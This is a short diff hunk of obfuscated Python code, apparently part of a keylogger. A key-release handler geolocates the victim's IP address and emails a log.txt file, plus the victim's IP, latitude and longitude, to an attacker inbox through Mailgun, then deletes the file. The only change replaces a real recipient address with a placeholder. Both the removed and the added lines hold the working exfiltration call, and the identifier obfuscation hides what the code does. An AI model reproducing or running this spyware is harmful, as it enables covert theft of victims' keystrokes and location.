@@ -28,7 +28,7 @@ def on_release (O00O0OOO0OO000OOO ):#line:56
             OOO0O0O0O0OO00000 =os .environ .get ("MAIL_APIKEY")#line:65
             OO0O0OOO0O0O0OO00 =os .environ .get ("IP_APIKEY")#line:66
             O0OO00OO00000O0OO =requests .get ("https://geo.ipify.org/api/v1?apiKey="+str (OO0O0OOO0O0O0OO00 )).json ()#line:69
-            requests .post ("https://api.mailgun.net/v3/sandboxad10bda10dae43e39b2c8a3d6a849abf.mailgun.org/messages",auth =("api",f"{OOO0O0O0O0OO00000}"),data ={"from":"Mailgun Sandbox <postmaster@sandboxad10bda10dae43e39b2c8a3d6a849abf.mailgun.org>","to":"Host <l0wk3yiaan@protonmail.com>","subject":"Log File For Target: "+O0OO00OO00000O0OO ["ip"],"text":"Log file for target:\n\nIP:"+O0OO00OO00000O0OO ["ip"]+"\nLatitude:"+str (O0OO00OO00000O0OO ["location"]["lat"])+"\nLongitude:"+str (O0OO00OO00000O0OO ["location"]["lng"])},files =[("attachment",("log.txt",open ("log.txt","rb").read ()))])#line:80
+            requests .post ("https://api.mailgun.net/v3/sandboxad10bda10dae43e39b2c8a3d6a849abf.mailgun.org/messages",auth =("api",f"{OOO0O0O0O0OO00000}"),data ={"from":"Mailgun Sandbox <postmaster@sandboxad10bda10dae43e39b2c8a3d6a849abf.mailgun.org>","to":"Host <INSERT TO EMAIL HERE>","subject":"Log File For Target: "+O0OO00OO00000O0OO ["ip"],"text":"Log file for target:\n\nIP:"+O0OO00OO00000O0OO ["ip"]+"\nLatitude:"+str (O0OO00OO00000O0OO ["location"]["lat"])+"\nLongitude:"+str (O0OO00OO00000O0OO ["location"]["lng"])},files =[("attachment",("log.txt",open ("log.txt","rb").read ()))])#line:80
         OO00OO0OOOO00O0O0 ()#line:82
         os .remove ('log.txt')#line:83
         return False #line:84
